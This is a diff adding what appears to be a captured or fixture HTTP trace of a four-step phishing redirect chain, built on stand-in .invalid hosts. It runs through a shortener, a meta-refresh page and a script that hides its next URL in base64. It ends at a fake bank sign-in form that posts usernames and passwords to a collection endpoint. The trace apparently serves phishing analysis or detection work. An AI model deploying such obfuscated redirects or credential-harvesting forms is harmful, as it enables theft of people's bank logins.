@@ -1,0 +1,42 @@
+### 1
+GET /x7Kp HTTP/1.1
+Host: short.example.invalid
+
+HTTP/1.1 302 Found
+Location: https://t.news-click.invalid/r?u=8f3a2
+
+### 2
+GET /r?u=8f3a2 HTTP/1.1
+Host: t.news-click.invalid
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><head>
+<meta http-equiv="refresh" content="0; url=https://gate.promo-wheel.invalid/go">
+</head><body>Loading...</body></html>
+
+### 3
+GET /go HTTP/1.1
+Host: gate.promo-wheel.invalid
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><body>
+<script>
+  setTimeout(function () { window.location = atob("aHR0cHM6Ly9zZWN1cmUtYWNjb3VudC12ZXJpZnkuaW52YWxpZC9sb2dpbg=="); }, 400);
+</script>
+</body></html>
+
+### 4
+GET /login HTTP/1.1
+Host: secure-account-verify.invalid
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><head><title>Sign in to your bank</title></head>
+<body><form method="post" action="/collect">
+<input name="user"><input name="pass" type="password"><button>Sign in</button>
+</form></body></html>
